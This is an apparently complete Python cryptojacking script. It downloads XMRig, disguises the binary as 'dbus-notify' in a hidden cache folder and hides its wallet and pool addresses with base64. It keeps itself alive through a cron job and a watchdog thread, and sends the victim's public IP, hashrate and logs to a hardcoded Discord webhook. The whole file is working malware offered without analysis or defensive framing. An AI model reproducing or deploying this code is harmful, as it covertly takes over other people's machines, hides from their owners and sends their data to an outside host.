import os, subprocess, time, socket, threading, requests, base64

# === Obfuscated Config ===
WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()
POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()
COIN = "zeph"
THREADS = "4"
RIG_ID = "sysd0"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"

# === Paths ===
BIN_DIR = os.path.expanduser("~/.cache/.X11-unix")
MINER_BIN = os.path.join(BIN_DIR, "dbus-notify")
LOGFILE = os.path.join(BIN_DIR, "syslog.txt")
SCRIPT_PATH = os.path.abspath(__file__)

status = {"running": False, "start_time": None}

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except:
        return ""

def send_discord(msg):
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": msg})
    except:
        pass

def install_miner():
    try:
        if os.path.isdir(MINER_BIN):
            subprocess.run(f"rm -rf {MINER_BIN}", shell=True)
        os.makedirs(BIN_DIR, exist_ok=True)
        archive = os.path.join(BIN_DIR, "xmr.tar.gz")
        url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
        run_cmd(f"wget -qO {archive} {url}")
        run_cmd(f"tar -xf {archive} -C {BIN_DIR}")
        for f in os.listdir(BIN_DIR):
            full = os.path.join(BIN_DIR, f)
            if "xmrig" in f and os.access(full, os.X_OK):
                os.rename(full, MINER_BIN)
                break
        os.chmod(MINER_BIN, 0o700)
    except Exception as e:
        send_discord(f"❌ Miner install error: {e}")

def start_miner():
    if not status["running"]:
        install_miner()
        cmd = f'{MINER_BIN} -o {POOL} -u {WALLET} -p x -a rx/0 --coin {COIN} -t {THREADS} --tls --rig-id {RIG_ID} --donate-level=1'
        with open(LOGFILE, "a") as log:
            subprocess.Popen(cmd.split(), stdout=log, stderr=log)
        status["running"] = True
        status["start_time"] = time.time()
        send_discord(f"✅ Miner started.\n{get_status()}")

def stop_miner():
    run_cmd(f"pkill -f {MINER_BIN}")
    status["running"] = False
    status["start_time"] = None
    send_discord("🛑 Miner stopped.")

def get_status():
    uptime = int(time.time() - status["start_time"]) if status["start_time"] else 0
    try:
        ip = requests.get("https://api.ipify.org").text.strip()
    except:
        ip = "unknown"
    return (
        f"💠 Status\n"
        f"Miner: {'✅ Running' if status['running'] else '❌ Stopped'}\n"
        f"IP: {ip}\n"
        f"Uptime: {uptime // 60} mins\n"
        f"Worker: {RIG_ID}\n"
        f"Threads: {THREADS}\n"
        f"Pool: {POOL}"
    )

def get_hashrate():
    try:
        out = run_cmd(f"tail -n 50 {LOGFILE}")
        for line in out.splitlines()[::-1]:
            if "speed" in line.lower():
                return line.strip()
        return "No hashrate yet."
    except:
        return "❓"

def setup_cron():
    cronline = f"*/3 * * * * pgrep -f {SCRIPT_PATH} > /dev/null || python3 {SCRIPT_PATH} &"
    croncmd = f'(crontab -l 2>/dev/null; echo "{cronline}") | sort | uniq | crontab -'
    run_cmd(croncmd)

def watchdog():
    while True:
        time.sleep(10)
        if status["running"]:
            check = run_cmd(f"pgrep -f {MINER_BIN}")
            if not check.strip():
                start_miner()

def self_guard():
    try:
        import psutil
        me = os.path.abspath(__file__)
        for p in psutil.process_iter(['pid', 'cmdline']):
            try:
                if p.pid != os.getpid() and me in ' '.join(p.cmdline()):
                    exit()
            except:
                pass
    except:
        send_discord("❌ Crash:\nNo module named 'psutil'")

def report_log():
    try:
        with open(LOGFILE) as f:
            content = f.read()[-1900:]
        send_discord(f"📝 Log:\n```{content}```")
    except:
        send_discord("📭 Log unavailable.")

def main():
    try:
        self_guard()
        setup_cron()
        threading.Thread(target=watchdog, daemon=True).start()
        start_miner()
        while True:
            time.sleep(1800)
            send_discord(f"⏳ Still alive\n{get_hashrate()}")
    except Exception as e:
        send_discord(f"❌ Crash:\n{str(e)}")

if __name__ == "__main__":
    main()
